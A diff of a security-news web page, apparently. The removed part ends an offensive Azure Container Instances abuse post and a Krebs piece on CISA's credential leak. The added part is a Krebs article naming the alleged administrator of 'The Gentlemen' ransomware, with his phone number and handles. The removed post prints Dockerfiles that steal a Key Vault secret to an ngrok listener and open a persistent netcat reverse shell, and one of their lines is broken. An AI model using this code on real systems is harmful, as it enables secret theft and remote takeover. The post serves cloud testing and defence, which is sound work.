-docker buildx build --platform <PLATFORM> -t <REGISTRY_NAME>.azurecr.io/<IMAGE>:<TAG> --load <DIRECTORY>
-az container restart --resource-group <RESOURCE_GROUP> --name <CONTAINER_NAME>
-This Dockerfile will exfiltrate the secret to your listener.
-FROM python:3.9-slim
-RUN apt-get update && \
-apt-get install -y bash curl jq ca-certificates netcat-openbsd && \
-rm -rf /var/lib/apt/lists/*
-WORKDIR /app
-RUN printf '%s\n' \
-'#!/bin/bash' \
-'echo "Container starting..."' \
-'echo "Requesting Managed Identity token..."' \
-'' \
-'TOKEN=$(curl -s -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq -r .access_token)' \
-'' \
-'if [ -z "$TOKEN" ] || [ "$TOKEN" = "null" ]; then' \
-' echo "Failed to get token"' \
-' exit 1' \
-'fi' \
-'' \
-'echo "Token acquired successfully"' \
-'echo "Fetching secret from Key Vault..."' \
-'SECRET=$(curl -s -H "Authorization: Bearer $TOKEN" https://<VAULT_NAME>.vault.azure.net/secrets/Image?api-version=7.4 | jq -r .value)' \
-'' \
-'if [ -z "$SECRET" ] || [ "$SECRET" = "null" ]; then' \
-' echo "Failed to fetch secret"' \
-' exit 1' \
-'fi' \
-'' \
-'echo "Secret retrieved successfully"' \
-'echo "Sending secret via netcat to ngrok..."' \
-'echo "Secret: $SECRET" | Nc <NGROK_URL><NGROK_PORT> \
-'' \
-'echo "Data sent!"' \
-'sleep 3600' \
-> /entrypoint.sh && \
-chmod +x /entrypoint.sh
-ENTRYPOINT ["/entrypoint.sh"]
-Reverse Shell With ngrok
-This follows the same process but establishes an actual connection to the compromised container. We specify a shell in the Dockerfile, build, and then push it to the registry. Once this is complete, we restart the container so it pulls the malicious image.
-We get a reverse shell and compromise the host after a 30-second wait!
-Reverse shell Dockerfile:
-cat Dockerfile
-FROM python:3.9-slim
-RUN apt-get update && \
-apt-get install -y bash netcat-openbsd && \
-rm -rf /var/lib/apt/lists/*
-WORKDIR /app
-RUN printf '%s\n' \
-'#!/bin/bash' \
-'echo "Container starting..."' \
-'echo "Establishing persistent reverse shell..."' \
-'' \
-'while true; do' \
-' rm -f /tmp/f; mkfifo /tmp/f' \
-' cat /tmp/f | /bin/bash -i 2>&1 | nc <NGROK_URL> <NGROK_PORT> > /tmp/f' \
-' echo "Connection lost, retrying in 5 seconds..."' \
-' sleep 5' \
-'done' \
-> /entrypoint.sh && \
-chmod +x /entrypoint.sh
-ENTRYPOINT ["/entrypoint.sh"]
-As you can see, the possibilities of ACI abuse are endless. You can exfiltrate secrets to your own listener or a webhook and even gain a shell back to your own machine.
-Mitigations
-Here are some recommendations on how to reduce this risk and prevent an attacker from getting permissions or roles like these.
-- Enforce least privilege to ensure broad roles like Contributor are rarely or never assigned. Try to scope to only required actions, or use PIM/JIT (Just-In-Time) access. This makes the role or permissions expire after a specified time period.
-- Use resource-level scoping specific to container assets and not subscription-wide.
-- Enforce MFA + Conditional Access policies to limit who gains access. Restrict access to specific IP address ranges or location-based authentication.
-I hope this was a twist of fun for you to read and learn from. I also hope this helps the offensive professionals out there with cloud testing, along with defenders and what to watch out for.
-Stay tuned for Part 2—coming soon!</div>
+Microsoft advisory said, some Dell PC maybe cause loop reboots after July updates
+I got my 570 updates installed! Went smoothly. Took 4 reboots. Everything has been running smoothly for the last day now.
+Ready for you now hackers!
+So AI did the discovery work here. But who triaged the bugs and scored their severity? Also an AI?</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-9" class="article-body">
-            <h2 class="article-title">Lessons Learned from CISA’s Recent GitHub Leak</h2>
-            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/07/lessons-learned-from-cisas-recent-github-leak/" target="_blank">Original Link</a></p>
-            <div class="content-text">The Cybersecurity and Infrastructure Security Agency (CISA) has issued a postmortem on a recent data leak in which a contractor published dozens of internal CISA credentials — including AWS Govcloud keys — in a public GitHub repository for almost six months before being notified by KrebsOnSecurity. Experts say the gaps identified in the agency’s initial response provide important lessons that all security teams should absorb.
-On May 15, 2026, the security firm GitGuardian asked for help in notifying CISA about the existence of a public GitHub repository called “Private CISA” that included 844 MB of sensitive CISA-related data. One of the exposed files, titled “importantAWStokens,” included the administrative credentials to three Amazon AWS GovCloud servers. Another file — “AWS-Workspace-Firefox-Passwords.csv” — listed plaintext usernames and passwords for dozens of internal CISA systems.
-CISA quickly acknowledged our initial alert, but took more than 48 hours to invalidate the AWS keys and many other important secrets leaked in the GitHub repo. In [its report on the data leak](https://www.cisa.gov/news-events/news/lessons-cisas-cyber-incident), CISA said the complexities of the agency’s systems and interconnections with federal and industry partners caused its key rotation to take longer than anticipated.
-“Drawing on this experience, CISA encourages others to maintain mature and well-tested key management capabilities,” the report notes.
-CISA also admitted it can do better when it comes to responding to security incident notifications from external parties. The postmortem stresses that clear and distinct reporting channels are essential to ensure that incidents affecting the organization itself are handled differently from those involving its products or customers.
-“In CISA’s case, these channels were not well defined, leading the security researcher to try multiple avenues – including emailing the contractor, submitting through CISA’s vulnerability disclosure platform (which is intended for vulnerabilities impacting the broader cybersecurity community), and ultimately involving a reporter,” reads the analysis written by Preston Werntz and Brad Libbey, the acting chief information officer and acting chief information security officer at CISA, respectively.
-CISA said it is refining its reporting channels to make them easier and faster for researchers. “Additionally, while many researchers rely on the security.txt file, organizations can ensure clarity by publishing reporting instructions in multiple prominent locations,” the CISA authors wrote.
-Guillaume Valadon, the GitGuardian researcher who first contacted KrebsOnSecurity about the exposed CISA credentials, said CISA ignored nine automated alerts about the exposed credentials prior to our notification on May 15. Valadon’s company constantly scans public code repositories at GitHub and elsewhere for exposed secrets, automatically alerting the offending accounts of any apparent sensitive data exposures.
-“Letting nine notification emails go unanswered is how a one-day incident becomes a six-month exposure,” Valadon [wrote](https://blog.gitguardian.com/cisa-github-leak-incident-response-lessons/) in an analysis of CISA’s report. “Make it trivial to report a leak about you, not just about your products. The person reporting a leak to you is not the threat. Publish a [security.txt](https://krebsonsecurity.com/2021/09/does-your-organization-have-a-security-txt-file/), but do not stop there. Put reporting instructions in several prominent places, and make sure a report about your own infrastructure does not land in a product-bug queue.”
-The report’s authors also emphasized the importance of continuously scanning public code repositories like GitHub for exposed secrets, and said CISA has since rotated all secrets and created an action plan to improve management of developer secrets and to better monitor for them going forward.
-The report notes that while CISA had developed a playbook for responding to cybersecurity incidents, that playbook somehow didn’t include what to do in situations involving GitHub or other cloud services. Valadon said the report validates the need to scan continuously — not just quarterly — for exposed secrets.
-“The Private-CISA repository sat public for six months,” Valadon wrote. “Continuous monitoring of public GitHub surfaced it. Comprehensive internal scanning could have caught the plaintext passwords and committed backups long before they left the building.”
-CISA gave itself passing grades on several areas of security preparedness that it said helped the agency gauge the scope and impact of the exposed secrets, including enhanced logging capabilities, and the adoption of zero-trust principles in both its production and development systems. CISA said those detailed logs allowed it to show that no customer or mission data was exposed, and that the leaked credentials were not used outside of CISA’s environments. The agency said the contractor who exposed the secrets had their system access revoked.
-Valadon reckons the biggest takeaway is the CISA postmortem itself, and praised the agency for being transparent about what worked and what didn’t.
-“To my knowledge, it is also the first time a national cybersecurity agency has publicly advocated for secrets scanning and for simplifying relations with security researchers,” Valadon wrote. “That is exactly the incident communication we should expect from every organization.”
-The government will always condone and positively critique its own behavior. Some bureaucrat(s) should at least lose their job and pensions as a result of this egregious fubar.
-Unfortunately, so many people have been culled at CISA and other agencies by the orange-faced buffoon there aren’t enough people left to do the job properly. Firing those who are already overworked and underpaid isn’t the answer. Yes, this incident was preventable and should have been caught sooner, but when your bosses boss changes priorities to make sure that national security takes a back seat to them making money these things happen.
-I’m surprised we didn’t print out that importantAWStokens text file and kept it in a cardboard box in a Mar A Lago bathroom. What else can you expect from the current government?
-I dunno about you, but I kind of don’t think it is a terrible idea to keep some printouts of keys offline in a safe place somewhere. Too many disk meltdowns and outages to not know how that can go.
-Thanks, Brian. There’s a reason I still read you daily, even though I retired from my sysadmin job in ’19.
-The root cause is the overuse of contractors. A long time ago, contractors were hired as experts for short-term projects where the regular staff had knowledge gaps. More recently, contractors are hired to avoid having regular staff. Regular staff had low turnover rates. Contractors have very high turnover rates. And now, many contractors are far from experts, they are closer to young and inexperienced. Whatever the staffing company can get. Young and inexperienced people should not be handling large files of sensitive data. Managers used to be responsible for their staff.
-Do DOGE cuts have any impact on this event? Would this happen have happened in earlier times?
-I agree with you, john. I think the recent DOGE cuts DID have something to do with it. I read morale was low and the people working there have had their workloads increased.
-wow
-If anybody out there in United States still think that any government agency in this country can keep any secrets about anything anymore. Let me dissuade you of that idea. Anything you share with the government will always be hacked and shared with the rest of the world. There are no secrets. If anybody thinks the Russians, the Chinese the North Koreans don’t know everything that goes on in this country with all our companies and the government is living in delusion land.
-“Another file — ‘AWS-Workspace-Firefox-Passwords.csv’ — listed plaintext usernames and passwords for dozens of internal CISA systems.”
-The bar is in hell and we’re still faceplanting</div>
+            <h2 class="article-title">Who Runs the Ransomware Group ‘The Gentlemen?’</h2>
+            <p class="source-link">Source: Krebs on Security | <a href="https://krebsonsecurity.com/2026/06/who-runs-the-ransomware-group-the-gentlemen/" target="_blank">Original Link</a></p>
+            <div class="content-text">A cybercrime group known as The Gentlemen has emerged as the second most active ransomware gang by victim count, rapidly attracting a talented pool of hackers through an aggressive recruitment strategy that promises affiliates 90 percent of any ransom paid by victims. This post examines clues pointing to a real life identity for the administrator of The Gentlemen ransomware group.
+Experts at the security firm Check Point Software have been closely covering exploits of The Gentlemen, a so-called “ransomware-as-a-service” (RaaS) offering that pays affiliates handsomely to help spread the group’s malware.
+“A 90/10 affiliate revenue split — compared to the industry standard 80/20 — is accelerating the group’s growth by attracting experienced operators from competing programs,” the researchers wrote in April.
+Check Point [found](https://research.checkpoint.com/2026/thus-spoke-the-gentlemen/) The Gentlemen are the second most active ransomware group by victim count so far this year, claiming at least 332 published victims since the group’s inception in mid-2025 and more than 240 in 2026 alone.
+According to Check Point, the group targets Internet-facing devices (VPNs, firewalls) as their entry point, and once inside moves quickly to encrypt entire networks within hours.
+Check Point says the administrator and primary operator of the ransomware group uses the nickname Zeta88 on the Russian-language cybercrime forums, and that this individual was previously known under the moniker Hastalamuerte. Check Point noted that [a breach](https://www.kelacyber.com/blog/the-gentlemen-ransomware-internal-chat-leak-analysis-2026/) of the group’s backend infrastructure made it clear that Hastalamuerte/Zeta88 is the person who assembles the locker and RaaS panel, manages payments, and is essentially the administrator of the entire program who receives 10 percent of all ransoms.
+WHO IS HASTALAMUERTE?
+The cyber intelligence firm Intel 471 shows that the user Hastalamuerte is a Russian and English speaking person who registered on almost a dozen cybercrime forums between 2019 and the present day, including Exploit, Breachforums, Ramp_V2, BHF, Raidforums, and Nulled.
+Intel 471 reveals that Hastalamuerte registered on Breachforums in January 2025 from an Internet address in Izhevsk, the capital city of Russia’s Udmurt Republic. Likewise, the user Zeta88 signed up at the English-language cybercrime forum Breached in August 2022 from a different Internet address in Izhevsk.
+Intel 471 finds Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of [two numeric symbols associated with white supremacy](https://en.wikipedia.org/wiki/Fourteen_Words)). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.
+Epieos says that Protonmail address is also linked to a GitHub account under the username SantaMuerte. That account is marked private, but [a history of this user’s activity](https://connectionrequired.com/gitspective/#/timeline/SantaLaMuerte) shows they are watching and developing a number of malware tools and exploits.
+In April 2020, Hastalamuerte said on the crime forum Nulled that they could be contacted at the Telegram instant messenger name @hastalamuerte18, and the threat intelligence company Flashpoint finds this username is assigned the unique Telegram ID number 30907522 [full disclosure: Flashpoint is an advertiser on this blog].
+The breach tracking service Constella Intelligence reports that Hastalamuerte’s Telegram ID is connected to another username — “bu4vs” — and to the Russian phone number 79127650004. Pivoting on this phone number in Constella fetches multiple records from hacked Russian government databases showing it is assigned to one Alexander Andreevich Yapaev, a 36-year-old from Izhevsk.
+Constella reveals that phone number was used to create an account at the Russian social media platform Pikabu under the name “4apai18,” and shows Mr. Yapaev has signed up at a number of websites using the common surname [Ivanov](https://x.com/bu4vs/status/235798656769470465), or else “Chapaev” (the numeral 4 is often used as shorthand for a “ch” sound in Russian).
+A search in Intel 471 for cybercrime forum members with the nickname SantaMuerte unearths an account by the same name created in 2020 on the Russian hacking forum Codeby. Intel 471 shows this user originally registered on Codeby with the not-so-subtle nickname Alexandr 4apaev.
+Constella finds Mr. Yapaev regularly used the email address bu4vs@mail.ru. Meanwhile, Epieos shows this address is connected to a [LinkedIn account](https://www.linkedin.com/in/yapaev/) for Alexander Yapaev, who lists himself as the head of B2B marketing at the company Uralenergo Udmurtia, one of Russia’s largest suppliers of electrotechnical and lighting products.
+Mr. Yapaev did not respond to multiple requests for comment.
+Nearly every time we publish one of these [Breadcrumbs stories](https://krebsonsecurity.com/category/breadcrumbs/), readers are curious to know why it seems like so many cybercriminals from Russia apparently do little to hide their real life identities. The truth is that — Russian or not — most didn’t exactly set out to be arch criminals, but instead got drawn into the scene gradually over several years as their skills broadened and sharpened.
+Another important dynamic is that the Russian government generally either [co-opts or ignores](https://www.recordedfuture.com/research/dark-covenant-3-controlled-impunity-and-russias-cybercriminals) cybercriminal activity within its borders so long as the hackers do not steal from or attack Russian businesses and citizens. As a result, successful cybercriminals in Russia are usually insulated from prosecution and arrest by foreign law enforcement agencies provided they occasionally pay off the right people and do not travel abroad. And cybercriminals who intend to strictly adhere to those unwritten rules may (at least initially) be less concerned about covering their tracks online.
+But the simplest explanation is that cybercriminals of all nationalities tend to make a number of basic operational security mistakes early in their careers, when they are less savvy and have far less to lose by their carelessness. A review of Hastalamuerte’s early posts on the crime forums (circa 2019-2020) shows a relatively unsophisticated and low-skilled hacker still trying to learn the ropes and earn a positive reputation on these communities.
+For example, in June 2020 Hastalamuerte’s Telegram account joined a multi-month training program (@pntst) to learn how to use popular penetration testing tools, and their candid posts to this hacker training camp show Hastalamuerte struggling to use these tools effectively. A Google-translated record of Hastalmuerte’s posts to @pntst is [here](https://krebsonsecurity.com/wp-content/uploads/2026/06/pntst-chat.txt).
+Update, June 11, 10:23 a.m. ET: The threat research group PRODAFT has released [a detailed writeup](https://catalyst.prodaft.com/public/report/inside-the-phantom-mantis-operation/overview#paragraph-1077|172) on the history and current operations of The Gentlemen. PRODAFT said its findings match the same persona with “high confidence,” and found the administrator (Zeta88/Hastalamuerte) supplies affiliates with initial access directly, primarily Fortinet SSL-VPN credentials obtained through brute-force attacks or sourced from the group’s own leak database. They also discovered the administrator is using AI to develop and maintain the ransomware and associated tooling, as well as to assist with post-exploitation activity.
+True operational secrecy is a pain in the butt, hard to maintain, and easy to screw up. That’s why it’s better to be able to act in your real name and not have to worry about it…
+It’s amazing how these ransomware gangs are able to maintain military intelligence level opsec
+Almost as if…
+Um, almost as if their business model provides enough income to afford it? Enough with the conspiracy theories. Brian understands that most of these sorts of operations have a learning curve. They are most vulnerable at three or four times in each ransom cycle (three, if it is an established affiliate relationship for long enough to have ascertained they aren’t involved in a sting). Once they figure out how to proxy, manage their toolchain properly, and successfully get ahold of the money they asked for, the only thing left to worry about is how to make it look legitimate. Ransomware removes the long-term upkeep and gradual profit model of a botnet. Now that companies are willing to pay hundreds of thousands or millions per incident, you don’t need to be ‘Russian’ or ‘Ukrainian’, or have connections to any sort of corrupt officials, you just have to throw someone else under the bus faster than the other person, it looks like.
+‘able to maintain military intelligence level opsec’
+Some of them are run by military intelligence in various countries, some of those are very good at it.
+I don’t think that’s amazing, unbelievable or improbable, nor is it a conspiracy theory. It lines up fine.
+If you’re trying to imply a _particular_ gang or campaign is run by mil.ops, that requires specificity.
+Vague implications are like…
+Has anyone told Apple about “Hastalamuerte registered on Raidforums in 2020 using the email address hastalamuerte1488@protonmail.com (1488 is a common combination of two numeric symbols associated with white supremacy). A lookup on this address at the open source intelligence service Epieos shows it is connected to an account at Apple and to a phone number ending in 04.”
+Can they disable his account?
+I don’t see why. He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple. Simply *being* a criminal shouldn’t get you disbarred from using any services.
+“He’s not infringing on any of Apple’s terms with his account, nor has he attacked Apple.”
+That _you_ know of? It’s improbable that nobody connected to Apple whatsoever was targeted.
+I’ve not recently deep-read Apple’s EULA but I’d think *being a criminal* is in there somehow…
+lol
+Hats off, GENTLEMEN, to Brian Krebs!
+It’s funny. When I start reading it, I thought to myself, “Russian?” And sure enough. It is.
+I think the reason it’s so easy to track there people down (aside from the Russian government letting them do it as long as the victims are in the West and that’s why they don’t care about hiding) is because most of those “hackers” are just plain stupid low lives. Otherwise anyone that had two brain cells had already left that nasty country.
+@Dennis – I think if you have money, are careful and discreet, and stay out of politics… Russia can be a veery pleasant place to live.
+Hmmm. Never seemed to work for Arkady Renko.
+I live next to Russia. I have friends and ex-colleagues in Russia (we had a branch office in Moscow). I speak Russian, I read Russian literature, I liste n to Russian music.
+No it is not pleasant place to live. Perhaps if you are very rich so you can live in a secure enclave.
+There is
+– corruption, being a daily part of the society on all levels
+– crime, the same, being constantly present in all places
+– censorship and surveillance
+– cynicism that permeates everything
+The company ended up dismantling the Moscow office and relocating the staff, on company expenses, to Central Europe.
+A bank that I worked for tried to expand to Russia. It backed off after a few years – the corruption was unmanageable.
+Russia has great nature, great culture, and the people are friendly and welcoming. But as a place to live – no, it is not pleasant at all.
+I think it most definitely matters where in Russia (or let’s be honest, here, what country near Russia) you are taking about. I think it is dangerous to confuse “low corruption” with “a different sort of corruption”, also. It is shocking how many ignorant people think Ukraine is or was less corrupt, for instance, or really, most any country in Central or Eastern Europe. Might make more sense to judge corruption by whether you wind up getting what you paid for (be it in money, favour, or just looking the other way). Some “corrupt” places, you get treated more fairly than some places people deem ‘fair’. Better a mechanism to work around corruption and bias, to some people, than no recompense or recourse. It might cost, but better that than no alternative.
+“Nasty country” – pray tell where you’ve found so entirely free of nastiness to live, Mr. Menace?
+Might as well be living on the sun.
+He’s got an umbrella and time to kill. It’s a dry heat.
+I believe his identity is BIG BALLS! You know the guy that got beat up by a girl in DC and even of more surprise he was on a date with a GIRL.
+Seems like something the snowflake orange one would be involved with.
+There was some chatter on Telegram about ShinyHunters running The Gentlemen ransomware group, but oh well…
+Not the same people, of course. Sort of like suggesting Horohorin is, I dunno, the dude that runs the Krebs carding dump site.
+No Doubt!
+TIL that WayBackMachine archived Google Plus (RIP) posts..
+It’s cute that even Russian ransomware gangs think stuff like… GDPR violations? matter at all in the real world.
+From reading the Checkpoint article, it definitely seems like we’re finally getting into the era of “AI-powered ransomware”. Not completely “agentic” a la “claude, ransom this company, make no mistakes”, but like… AI-written panels, AI-written ransom notes, and seeing as how quick and badly they got pwned, I’d imagine some local Chinese AI was like “You’re absolutely right, exposing port 445 on your Synology NAS to the clearnet is the most secure way to securely access your files anywhere!” and now we’re here.
+This pretty much nulls most textual forensics, too, yeah.
+When I lived in Transnistria briefly, many many years ago, there were no ATMs at all. It was a surprisingly genteel place to stay for a week or two to get away from crazies, LGBTQ- obsessed Pussy Riot fans, and tourists, until they made that mean something else entirely. CLEARLY, there was access to legitimate ATMs an easy, cheap train-ride away, until the sheeeyit hit the Kendrick a few months (and many many years) later.
+welp! time for my teeth to marry the extension cord again!
+Arguably, they should not, merely by the existence of a name, known it was the same person, no less a ‘criminal’, right?
+soon the next prod release of Kill Your Celf will push!
+Quickly, quickly ai chatbot!
+The NSA.
+WHAT DID I WIN
+The same guys who run every ransomware group
+The same guys who run Krebs.
+Did you use a real russian time?Brian , or is it a synthetic russian?
+Cant arrest data. Even from the Moscow field office of the FBI
+The same guys who run every ransomware group
+The same guys who run Krebs.
+Did you use a real russian this time?Brian , or is it a synthetic russian?
+Cant arrest data. Even from the Moscow field office of the FBI
+If Yan can’t think then NOBODY IS ALLOWED TO. Off to the reeducation camps like a good lad.
+Martin,
+Go squat in a thorny tree.
+What is Martin’s metier, anyway?
+Krebs isn’t run by any one group of anything any more than you are.
+Lots of AI slop puppeting every meatpuppet now (no offense, Brian).
+Great breakdown on threat actor attribution. Security research like this is essential for organizations evaluating third-party risk. I run a site covering crypto and financial analysis and send your investigative work to clients regularly as a reference.
+Very interesting article, I always say there’s only one internet and there’s residue from everyone on it. And now with AI able to aggregate so much it truly shows that the internet is us and we are the internet. We’ve been building our digital persona for years, our essence is in the very fabric.
+Dropping a quick note of appreciation. Superb post.
+Rare to see such a balanced take. Appreciate you putting the time into this. Take care.
+You turned what’s usually a dry topic into something readable. Saved me hours of digging around.</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
